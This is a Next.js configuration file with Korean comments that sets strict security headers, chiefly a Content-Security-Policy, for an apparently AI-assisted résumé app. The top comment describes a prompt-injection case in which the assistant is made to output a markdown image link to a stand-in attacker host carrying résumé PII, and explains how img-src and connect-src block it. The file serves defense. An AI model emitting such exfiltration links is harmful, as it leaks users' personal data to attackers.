import type { NextConfig } from "next";

/**
 * 보안 헤더
 * ------------------------------------------------------------------
 * 특히 CSP는 이 앱에서 **실제 공격 경로 하나를 직접 막습니다.**
 *
 * 어시스턴트 응답은 마크다운으로 렌더링됩니다. 프롬프트 인젝션에 성공한
 * 공격자가 `![](https://공격자/?d=<이력서PII>)` 한 줄만 출력하게 만들면
 * 브라우저가 **클릭 없이** 그 URL을 요청합니다(React는 preload까지 붙입니다).
 * `img-src`가 이 요청을 차단합니다. (1차 방어는 MessageBubble에서 img를
 * 아예 렌더링하지 않는 것이고, 이건 2차 방어입니다.)
 *
 * `connect-src 'self'`는 같은 이유로 fetch/XHR 유출 경로를 막습니다.
 * pdfjs를 로컬 번들로 옮긴 덕분에 외부 출처를 하나도 허용하지 않아도 됩니다.
 *
 * `'unsafe-inline'`이 script-src에 남아 있는 이유: Next의 하이드레이션
 * 부트스트랩이 인라인 스크립트를 씁니다. 없애려면 nonce를 발급하는 미들웨어가
 * 필요합니다. 다만 이 앱에는 확인된 XSS 경로가 없습니다 —
 * react-markdown은 rehype-raw 없이 원시 HTML을 이스케이프하고,
 * 인쇄용 HTML은 모든 사용자 입력을 escape합니다.
 */
const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  // 이미지 유출 채널 차단 — 원격 출처를 일절 허용하지 않습니다.
  "img-src 'self' data: blob:",
  // next/font가 폰트를 빌드 타임에 self-host하므로 외부 출처가 필요 없습니다.
  "font-src 'self' data:",
  // API는 same-origin뿐입니다.
  "connect-src 'self'",
  // pdfjs 워커
  "worker-src 'self' blob:",
  // 이력서 인쇄용 srcdoc iframe
  "frame-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
].join('; ');

const SECURITY_HEADERS = [
  { key: 'Content-Security-Policy', value: CSP },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'X-Frame-Options', value: 'DENY' },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=(), interest-cohort=()',
  },
];

const nextConfig: NextConfig = {
  reactCompiler: true,
  /* `serverExternalPackages: ["pdfjs-dist"]`를 제거했습니다.
   * pdfjs를 CDN에서 받던 시절, 서버 번들이 canvas를 참조해 깨지는 것을 막는
   * 설정이었습니다. 지금은 클라이언트에서만 동적 import하므로 서버 번들에
   * 아예 등장하지 않고, 오히려 이 설정이 워커 파일(pdf.worker.min.mjs) 번들링과
   * 충돌해 "Package pdfjs-dist can't be external" 경고를 냈습니다. */
  async headers() {
    return [{ source: '/:path*', headers: SECURITY_HEADERS }];
  },
};

export default nextConfig;
